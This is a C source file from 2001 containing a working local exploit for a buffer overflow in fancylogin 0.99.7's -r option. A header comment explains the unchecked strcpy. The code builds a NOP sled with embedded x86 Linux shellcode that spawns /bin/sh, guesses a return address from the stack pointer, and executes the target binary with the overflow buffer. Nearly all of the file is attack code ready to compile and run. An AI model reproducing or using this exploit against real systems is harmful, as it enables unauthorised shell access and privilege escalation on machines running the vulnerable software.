/*
 *                       <Sun Mar 11 04:09:29 CET 2001> 
 * TILE: fancylogin-xpl
 * 
 * CODER: Ripe - <ripe@7a69ezine.org>
 * 
 * NOTE: This is a simple buffer overflow in option -r of fancylogin. I read 
 *       this vulneravility in InputRequest mailing list. Thanks to _kiss_ to
 *       post it.
 *       
 *       In source of this program you can read:
 *
 *       if ((argc>=3) && ((strcmp(argv[1], "-r")==0) || (strcmp(argv[1], "-h") == 0)))    
 *         strcpy (rmthost, argv[2]);
 * 
 *       Is easy to view that there is a problem because the coder is using
 *       strcpy() whithout source string len control.
 * 
 *       I saw that you must to put 313 chars to overwrite RET 
 *
 *       server:~# fancylogin -r `perl -e '{ print "A"x313 }'`
 *       This is fancylogin 0.99.7
 *       <http://fancylogin.sourceforge.net/>.
 *       Segmentation fault
 * 
 * SALUTES: To people of 7a69 and #root. And for people that are in 
 *          InputRequest mailing list.
 * 
 * 
 *       Ripe/7a69 - <ripe@7a69ezine.org>
 *       http://www.7a69ezine.org
 *
 */

#include <stdio.h>

#define BUFSIZE 313
#define FANCYPATH "/bin/fancylogin"

char shellcode[] = /* anathema <anathema@hack.co.za> */
/* main: */
"\xeb\x1d"                                /* jmp callz               */
/* start: */
"\x5e"                                    /* popl %esi               */
"\x29\xc0"                                /* subl %eax, %eax         */
"\x88\x46\x07"                            /* movb %al, 0x07(%esi)    */
"\x89\x46\x0c"                            /* movl %eax, 0x0c(%esi)   */
"\x89\x76\x08"                            /* movl %esi, 0x08(%esi)   */
"\xb0\x0b"                                /* movb $0x0b, %al         */
"\x87\xf3"                                /* xchgl %esi, %ebx        */
"\x8d\x4b\x08"                            /* leal 0x08(%ebx), %ecx   */
"\x8d\x53\x0c"                            /* leal 0x0c(%ebx), %edx   */
"\xcd\x80"                                /* int $0x80               */
"\x29\xc0"                                /* subl %eax, %eax         */
"\x40"                                    /* incl %eax               */
"\xcd\x80"                                /* int $0x80               */
/* callz: */
"\xe8\xde\xff\xff\xff"                    /* call start              */
"/bin/sh\0";

unsigned long get_sp(void) {
  __asm__("movl %esp, %eax");
}

int view_usage(char *cmd) {
  printf("Usage:\n");
  printf("%s <offset> [<fancylogin path>]\n", cmd);
  exit(0);
}

int main(int argc, char **argv) {
  char bad_buf[BUFSIZE+1];
  char *fancypath=NULL;
  long *ret=&bad_buf[BUFSIZE-4];
  int offset;
  printf("linux fancylogin < 0.99.7 exploit by Ripe - <ripe@7a69ezine.org>\n");
  if (argc<2) view_usage(argv[0]);
  if (argc>2) fancypath=argv[2];
  offset=atoi(argv[1]);
  bzero(bad_buf, BUFSIZE+1);
  memset(bad_buf, 0x90, BUFSIZE);
  strncpy((bad_buf+BUFSIZE)-(strlen(shellcode)+4), shellcode, strlen(shellcode));
  *ret=get_sp();
  *ret=*ret+offset;
  printf("Using RET: %x\n", *ret);
  printf("Exploting....\n");
  if (fancypath!=NULL) execl(fancypath, "fancylogin", "-r", bad_buf, NULL);
  else execl(FANCYPATH, "fanclylogin", "-r", bad_buf, NULL);
  printf("oooop!, something is happening.\n");
}
